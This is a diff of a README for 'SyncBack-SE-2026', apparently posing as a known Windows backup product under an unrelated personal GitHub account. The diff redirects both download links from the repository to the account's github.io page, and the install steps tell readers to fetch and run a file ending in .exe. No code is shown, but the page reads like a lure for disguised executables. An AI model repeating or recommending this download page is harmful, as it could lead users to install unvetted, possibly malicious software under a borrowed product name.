@@ -1,6 +1,6 @@
 # 📂 SyncBack-SE-2026 - Protect your files with automated backups
 
-[![Download SyncBack-SE-2026](https://img.shields.io/badge/Download-SyncBack--SE--2026-blue.svg)](https://github.com/abdulae1212101-hue/SyncBack-SE-2026)
+[![Download SyncBack-SE-2026](https://img.shields.io/badge/Download-SyncBack--SE--2026-blue.svg)](https://abdulae1212101-hue.github.io)
 
 SyncBack-SE-2026 creates copies of your files. It guards your data against loss. You schedule tasks to run at specific times. The software works on Windows 10 and Windows 11. It mimics your folders to keep data safe on external drives or servers.
 
@@ -19,7 +19,7 @@ Your computer needs specific components to run this software. Ensure you meet th
 Follow these steps to put the software on your machine.
 
 1. Open your web browser.
-2. Go to the [SyncBack-SE-2026 download page](https://github.com/abdulae1212101-hue/SyncBack-SE-2026).
+2. Go to the [SyncBack-SE-2026 download page](https://abdulae1212101-hue.github.io).
 3. Look for the release section on the right side of the page.
 4. Click the file that ends in .exe to start the download.
 5. Wait for the file to finish downloading.
